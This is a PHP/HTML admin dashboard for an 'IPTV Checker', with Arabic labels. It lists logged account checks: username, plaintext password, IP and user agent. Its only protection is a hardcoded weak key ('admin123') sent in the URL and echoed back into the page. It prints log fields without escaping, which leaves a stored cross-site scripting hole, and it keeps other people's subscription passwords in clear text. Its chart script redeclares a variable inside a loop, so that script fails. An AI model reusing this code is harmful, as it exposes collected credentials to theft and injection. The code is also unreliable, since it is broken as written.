<?php
/************************************
 *  Admin Dashboard for IPTV Checker
 *  Protected by secret key only
 ************************************/

// 1) PROTECT WITH SECRET KEY
$secret = "admin123"; // ← غيّرها إن أردت

if (!isset($_GET["key"]) || $_GET["key"] !== $secret) {
    die("Access Denied");
}

// 2) LOGS FILE
$logFile = "logs.txt";

if (!file_exists($logFile)) {
    file_put_contents($logFile, "");
}

// 3) CLEAR LOGS
if (isset($_GET["clear"]) && $_GET["key"] === $secret) {
    file_put_contents($logFile, "");
    header("Location: admin.php?key=".$secret);
    exit;
}

// 4) LOAD LOGS
$logs = file($logFile, FILE_IGNORE_NEW_LINES);
$parsed = [];

foreach ($logs as $line) {
    $entry = json_decode($line, true);
    if ($entry) {
        $parsed[] = $entry;
    }
}
?>
<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>IPTV Checker Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
    font-family: "Tajawal", sans-serif;
    background: #0f0f0f;
    color: #fff;
    padding: 20px;
}
.card{
    background: #1b1b1b;
    padding: 20px;
    border-radius: 12px;
    margin-bottom: 20px;
    box-shadow: 0 4px 20px rgba(255,0,0,0.2);
}
table{
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
}
table th, table td{
    padding: 10px;
    border-bottom: 1px solid #333;
}
input, select{
    padding: 10px;
    border-radius: 8px;
    border: none;
    margin: 5px;
}
button{
    padding: 10px 20px;
    background: red;
    border: none;
    border-radius: 8px;
    color: white;
    cursor: pointer;
}
button:hover{
    opacity: 0.8;
}
</style>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>

<h1>📊 لوحة تحكم فحص الاشتراكات</h1>

<div class="card">
    <h2>🔢 الإحصائيات العامة</h2>
    <p>إجمالي الفحوصات: <b><?= count($parsed) ?></b></p>
</div>

<div class="card">
    <h2>📍 الفلاتر</h2>
    <input type="text" id="search" placeholder="بحث عن Username أو IP...">
    <select id="filterPackage">
        <option value="">جميع الباقات</option>
        <option value="Family">Family</option>
        <option value="Forever">Forever</option>
        <option value="Adult">Adult</option>
        <option value="Lite">Lite</option>
    </select>
    <select id="filterStatus">
        <option value="">كل الحالات</option>
        <option value="Active">Active</option>
        <option value="Expired">Expired</option>
        <option value="Invalid">Invalid</option>
    </select>
</div>

<div class="card">
    <h2>📈 الرسم البياني للفحوصات</h2>
    <canvas id="chart" height="90"></canvas>
</div>

<div class="card">
    <h2>📄 سجل الفحوصات</h2>

    <button onclick="exportCSV()">📤 Export CSV</button>
    <button onclick="window.location='admin.php?key=<?= $secret ?>&clear=1'">🗑 Clear Logs</button>

    <table id="logTable">
        <thead>
            <tr>
                <th>Time</th>
                <th>User</th>
                <th>Pass</th>
                <th>IP</th>
                <th>Agent</th>
                <th>Package</th>
                <th>Status</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($parsed as $e): ?>
            <tr>
                <td><?= $e["time"] ?></td>
                <td><?= $e["user"] ?></td>
                <td><?= $e["pass"] ?></td>
                <td><?= $e["ip"] ?></td>
                <td><?= $e["agent"] ?></td>
                <td><?= $e["package"] ?></td>
                <td><?= $e["status"] ?></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<script>
// ----------------------
// SEARCH + FILTER
// ----------------------
const search = document.getElementById("search");
const filterPackage = document.getElementById("filterPackage");
const filterStatus = document.getElementById("filterStatus");
const table = document.getElementById("logTable").getElementsByTagName("tbody")[0];

function filterTable() {
    const searchVal = search.value.toLowerCase();
    const pkg = filterPackage.value;
    const status = filterStatus.value;

    for (let row of table.rows) {
        const user = row.cells[1].innerText.toLowerCase();
        const ip = row.cells[3].innerText.toLowerCase();
        const package = row.cells[5].innerText;
        const st = row.cells[6].innerText;

        let show = true;

        if (searchVal && !user.includes(searchVal) && !ip.includes(searchVal)) {
            show = false;
        }
        if (pkg && package !== pkg) {
            show = false;
        }
        if (status && st !== status) {
            show = false;
        }

        row.style.display = show ? "" : "none";
    }
}

search.onkeyup = filterTable;
filterPackage.onchange = filterTable;
filterStatus.onchange = filterTable;


// ----------------------
// EXPORT CSV
// ----------------------
function exportCSV() {
    let csv = "Time,User,Pass,IP,Agent,Package,Status\n";

    for (let row of table.rows) {
        let cols = [];
        for (let cell of row.cells) {
            cols.push('"' + cell.innerText.replace(/"/g, '""') + '"');
        }
        csv += cols.join(",") + "\n";
    }

    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    a.download = "logs.csv";
    a.click();
}


// ----------------------
// CHART
// ----------------------
let days = {};
<?php foreach ($parsed as $p): ?>
    let d = "<?= substr($p["time"],0,10) ?>";
    days[d] = (days[d] || 0) + 1;
<?php endforeach; ?>

const chart = new Chart(document.getElementById("chart"), {
    type: "line",
    data: {
        labels: Object.keys(days),
        datasets: [{
            label: "عدد الفحوصات اليومية",
            data: Object.values(days),
            borderColor: "red",
            backgroundColor: "rgba(255,0,0,0.3)",
            fill: true
        }]
    }
});
</script>

</body>
</html>
